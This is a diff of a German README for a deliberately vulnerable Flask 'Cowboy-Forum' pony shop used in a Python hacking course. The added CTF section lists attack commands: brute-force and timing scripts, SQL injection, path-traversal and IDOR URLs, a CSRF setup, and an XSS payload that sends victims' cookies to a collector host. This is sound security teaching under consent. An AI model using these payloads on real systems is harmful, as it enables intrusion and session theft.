@@ -1,9 +1,15 @@
 # 🤠 Cowboy-Forum — Hacking mit Python (Sicherheits-Lab)
 
 Ein **Lehr-Lab** für den Kurs *Hacking mit Python*, gestaltet als **Cowboy-Forum**
-(Wilder-Westen-Saloon). Eine Flask-Web-App entwickelt sich über nummerierte Ordner
-**schrittweise weiter**. Jeder Ordner ist eigenständig lauffähig, baut auf dem
-vorherigen auf und fügt ein Thema hinzu (Feature, Schwachstelle **oder** Fix).
+(Wilder-Westen-Saloon) mit **Ponyverkauf**, Anschlagbrett und Login. Eine Flask-Web-App
+entwickelt sich über nummerierte Ordner **schrittweise weiter**. Jeder Ordner ist
+eigenständig lauffähig, baut auf dem vorherigen auf und fügt ein Thema hinzu
+(Feature, Schwachstelle **oder** Fix).
+
+Die **Seiten selbst lesen sich wie ein echter Shop** — kein Aufgaben-Text im UI. Die
+Schwachstellen sind natürlich in die Features eingebaut (z. B. SQL-Injection in der
+Pony-Suche, Stored-XSS in Pony-Beschreibungen). Erklärungen stehen nur in diesen
+READMEs und in Code-Kommentaren.
 
 > ⚠️ **Absichtlich verwundbar. Nur fürs Kurs-Netz.**
 > Die Ordner mit „Angriff" enthalten bewusste Lücken. Betreibe die App **nur** in einem
@@ -25,6 +31,36 @@ python app.py         # -> http://<deine-LAN-IP>:5000
 - Host/Port umstellen: `set HOST=127.0.0.1` bzw. `set PORT=8000` vor `python app.py`.
 - **Firewall:** Windows fragt beim ersten Start, ob Python im Netz kommunizieren darf —
   im Kurs-Netz erlauben, danach wieder sperren.
+
+## Skripte gegen Mitspieler richten (CTF im Kurs)
+Jede/r betreibt die eigene verwundbare Instanz; ihr greift euch **gegenseitig** an.
+Alle Angriffs-Skripte nehmen das Ziel als Parameter (oder `TARGET_URL`-Umgebungsvariable),
+Standard ist `http://127.0.0.1:5000`:
+
+```powershell
+# IP des Ziels: die Person nennt dir ihre IPv4 (ipconfig). Beispiel: 192.168.1.42
+
+# Brute Force gegen fremde Instanz
+python 08_brute_force/attack_playwright.py --base http://192.168.1.42:5000 --user admin --wordlist rockyou_small.txt
+
+# Timing-Attack gegen fremde Instanz
+python 16_timing_attack/attack_timing.py --base http://192.168.1.42:5000
+
+# SQL-Injection / LFI / IDOR: einfach die Ziel-IP in die URL setzen
+#   http://192.168.1.42:5000/ponys?q=%' OR '1'='1
+#   http://192.168.1.42:5000/disclaimer?page=../app.py
+#   http://192.168.1.42:5000/note/2
+
+# XSS-Cookie-Klau: Collector auf DEINEM Rechner starten (0.0.0.0), im Payload DEINE IP:
+python 10_xss/collector.py         # sammelt in loot.log
+#   Payload im Ponytext/Board des Opfers:
+#   <script>new Image().src="http://<DEINE-IP>:5001/steal?c="+encodeURIComponent(document.cookie)</script>
+
+# CSRF: in 12_csrf/csrf_attack.html das TARGET auf die Opfer-Instanz setzen und die Seite teilen.
+```
+
+> Fair-Play-Regel: nur Instanzen angreifen, deren Betreiber:innen mitspielen, und nur im
+> Kurs-Netz. Das ist ein Übungs-CTF unter Einverständnis — keine fremden Systeme.
 
 ## Aufbau — jede Zeile der Aufgabe = ein Ordner
 
